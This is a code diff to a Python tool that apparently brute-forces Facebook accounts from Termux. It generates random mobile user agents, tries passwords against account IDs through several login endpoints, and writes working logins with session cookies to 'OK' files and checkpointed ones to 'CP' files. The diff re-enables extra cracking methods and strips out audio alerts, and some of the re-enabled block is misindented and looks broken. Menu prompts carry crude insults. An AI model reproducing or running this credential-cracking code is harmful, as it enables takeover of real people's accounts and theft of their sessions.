@@ -57,7 +57,7 @@ for xd in range(10000):
 	j=random.randrange(1, 4)
 	k='Mobile Safari/535.1'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
+	ugen.append(uaku)
 	
 	aa='Mozilla/5.0 (Linux; Android ; '
 	b=random.choice(['7.0','8.1.0','9','10','11','12'])
@@ -808,17 +808,17 @@ def setting():
 		for xmud in range(bcm):
 			id2.append(muda[bcmi])
 			bcmi -=1
-#	elif hu in ['3','03']:
-#		for bacot in id:
-#			xx = random.randint(0,len(id2))
-#			id2.insert(xx,bacot)
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
 	else:
 		print('>> Pilih Yang Bener Kontooll ')
 		exit()
 	print('>> 1. Mobile ')
-#	print('>> 2. Mbasic ')
-#	print('>> 3. Touch  ')
-#	print('>> 4. Mtouch ')
+	print('>> 2. Mbasic ')
+	print('>> 3. Touch  ')
+	print('>> 4. Mtouch ')
 	print('')
 	hc = input('>> Pilih : ')
 	if hc in ['1','01']:
@@ -826,10 +826,10 @@ def setting():
 	elif hc in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		setting()
-#	elif hc in ['2','02']:
-#		method.append('free')
-#	elif hc in ['3','03']:
-#		method.append('touch')
+	elif hc in ['2','02']:
+		method.append('free')
+	elif hc in ['3','03']:
+		method.append('touch')
 	elif hc in ['4','04']:
 		method.append('mbasic')
 	else:
@@ -931,7 +931,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				os.popen('play-audio data/cp.mp3')
+				
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -943,7 +943,7 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					os.popen('play-audio data/ok.mp3')
+					
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
@@ -967,7 +967,7 @@ def crack(idf,pwv):
 						hit+=1
 						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
 					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
-					os.popen('play-audio data/ok.mp3')
+					
 					ok+=1
 					break
 
@@ -996,7 +996,7 @@ def crackfree(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				os.popen('play-audio .cp.mp3')
+				
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -1023,7 +1023,7 @@ def crackfree(idf,pwv):
 					hit+=1
 					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
 				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
-				os.popen('play-audio .ok.mp3')
+				
 				ok+=1
 				break
 
@@ -1033,28 +1033,28 @@ def crackfree(idf,pwv):
 			time.sleep(1)
 	loop+=1
 
-#			if "checkpoint" in po.cookies.get_dict().keys():
-#				print(f'\r{K}>> {idf}|{pw}{N}')     
-#				os.popen('play-audio .cp.mp3')
-#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-#				akun.append(idf+'|'+pw)
-#				cp+=1
-#				break
-#			elif "c_user" in ses.cookies.get_dict().keys():
-#				ok+=1
-#				coki=po.cookies.get_dict()
-#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
-#				os.popen('play-audio .ok.mp3')
-#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-#				cek_apk(session,coki)
-#				break
-#				
-#			else:
-#				continue
-#		except requests.exceptions.ConnectionError:
-#			time.sleep(31)
-#	loop+=1
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r{K}>> {idf}|{pw}{N}')     
+				os.popen('play-audio .cp.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
+				os.popen('play-audio .ok.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				cek_apk(session,coki)
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 
 #---------------------[ METHODE-TOUCH-3 ]---------------------#
 def cracktouch(idf,pwv):
@@ -1339,8 +1339,6 @@ if __name__=='__main__':
 	try:os.mkdir('/sdcard/ALVINO-DUMP')
 	except:pass
 	try:os.system('touch .prox.txt')
-	except:pass
-	try:os.system('pkg install play-audio')
 	except:pass
 	try:os.system('clear')
 	except:pass
